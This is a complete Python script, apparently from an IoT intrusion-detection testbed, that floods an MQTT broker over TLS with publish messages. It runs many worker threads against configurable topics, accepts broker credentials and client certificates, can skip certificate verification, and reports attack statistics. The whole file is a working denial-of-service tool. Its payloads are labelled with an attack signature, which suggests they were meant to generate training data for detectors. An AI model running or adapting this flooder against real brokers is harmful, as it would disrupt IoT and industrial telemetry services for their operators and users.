#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
import ssl
from datetime import datetime, timezone

class PublishFloodAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883, ca_certs=None, client_cert=None, client_key=None, insecure=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.client_cert = client_cert
        self.client_key = client_key
        self.insecure = insecure
        self.attack_stats = {
            "messages_sent": 0,
            "messages_failed": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }
        self.stop_event = threading.Event()

    def _print_cert_status(self):
        if self.ca_certs:
            print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
        else:
            print("  No CA file provided; will use system CA store (if available).")
        if self.client_cert or self.client_key:
            print(f"  Client cert: {self.client_cert} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING or not provided'}")
            print(f"  Client key : {self.client_key} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING or not provided'}")
        print(f"  Insecure mode (skip verification): {self.insecure}")

    def create_client(self, client_id, username=None, password=None):
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(ca_certs=self.ca_certs,
                               certfile=self.client_cert if self.client_cert and os.path.exists(self.client_cert) else None,
                               keyfile=self.client_key if self.client_key and os.path.exists(self.client_key) else None,
                               cert_reqs=ssl.CERT_REQUIRED,
                               tls_version=ssl.PROTOCOL_TLS_CLIENT,
                               ciphers=None)
                if getattr(client, "tls_set_context", None):
                    pass
            else:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
                    ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            if self.insecure:
                try:
                    client.tls_insecure_set(True)
                except Exception:
                    pass

            if username and password:
                client.username_pw_set(username, password)

            def on_connect(c, u, flags, rc):
                if rc != 0:
                    print(f"  {client_id}: connect returned code {rc}")
            client.on_connect = on_connect

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def flood_worker(self, worker_id, num_messages, topics, delay_ms=0, username=None, password=None):
        client_id = f"Attack_flood_{worker_id}"
        client = self.create_client(client_id, username, password)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id}: Connected (TLS), starting flood attack...")
            for i in range(num_messages):
                if self.stop_event.is_set():
                    print(f" Worker {worker_id}: Stop requested, ending early.")
                    break

                try:
                    topic = random.choice(topics)
                    payload = {
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "packet_type": "PUBLISH",
                        "client_id": client_id,
                        "topic": topic,
                        "dupflag": 0,
                        "qos": 0,
                        "retain": False,
                        "payload_length": random.randint(100, 1000),
                        "src_ip": "127.0.0.1",
                        "attack_signature": "R1_PUBLISH_FLOOD",
                        "worker_id": worker_id,
                        "message_id": i,
                        "flood_data": "F" * random.randint(100, 1000)
                    }

                    info = client.publish(topic, json.dumps(payload), qos=0)
                    if getattr(info, "rc", 1) == 0:
                        self.attack_stats["messages_sent"] += 1
                    else:
                        self.attack_stats["messages_failed"] += 1

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                    if i % 100 == 0 and i != 0:
                        print(f" Worker {worker_id}: Sent {i}/{num_messages} messages (TLS)")

                except Exception as e:
                    self.attack_stats["messages_failed"] += 1
                    if i % 100 == 0:
                        print(f" Worker {worker_id}: Error sending message {i}: {e}")

            print(f" Worker {worker_id}: Completed (sent {num_messages} loop or stopped early)")

        except Exception as e:
            print(f" Worker {worker_id}: Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=5, messages_per_worker=1000,
                     topics=None, delay_ms=0, duration_seconds=None, username=None, password=None):
        if topics is None or len(topics) == 0:
            topics = [
                "factory/storage/storage-sensor_temp/telemetry",
               
            ]

        print(f" Starting Publish Flood Attack (TLS)")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Total messages: {num_workers * messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        self._print_cert_status()
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, messages_per_worker, topics, delay_ms, username, password),
                daemon=True
            )
            threads.append(thread)

        for thread in threads:
            thread.start()

        try:
            if duration_seconds:
                print(f"  Attack will run for {duration_seconds} seconds...")
                time.sleep(duration_seconds)
                print("  Stopping attack after duration limit...")
                self.stop_event.set()
            else:
                for thread in threads:
                    thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
            self.stop_event.set()
            for thread in threads:
                thread.join(timeout=1)

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        total_messages = self.attack_stats["messages_sent"] + self.attack_stats["messages_failed"]

        print("\n Attack Statistics (TLS):")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        print(f"Messages failed: {self.attack_stats['messages_failed']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Success rate: {(self.attack_stats['messages_sent']/total_messages*100):.1f}%" if total_messages > 0 else "N/A")
        print(f"Messages per second: {(self.attack_stats['messages_sent']/duration):.1f}" if duration > 0 else "N/A")

def main():
    parser = argparse.ArgumentParser(description="MQTT Publish Flood Attack (TLS)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=8883, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=5, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=1000, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=0, help="Delay between messages (ms)")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom topics to attack")
    parser.add_argument("--username", help="MQTT username for authentication")
    parser.add_argument("--password", help="MQTT password for authentication")
    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")

    args = parser.parse_args()

    attack = PublishFloodAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,
        client_cert=args.client_cert,
        client_key=args.client_key,
        insecure=args.insecure
    )

    attack.launch_attack(
        num_workers=args.workers,
        messages_per_worker=args.messages,
        topics=args.topics,
        delay_ms=args.delay,
        duration_seconds=args.duration,
        username=args.username,
        password=args.password
    )

if __name__ == "__main__":
    main()
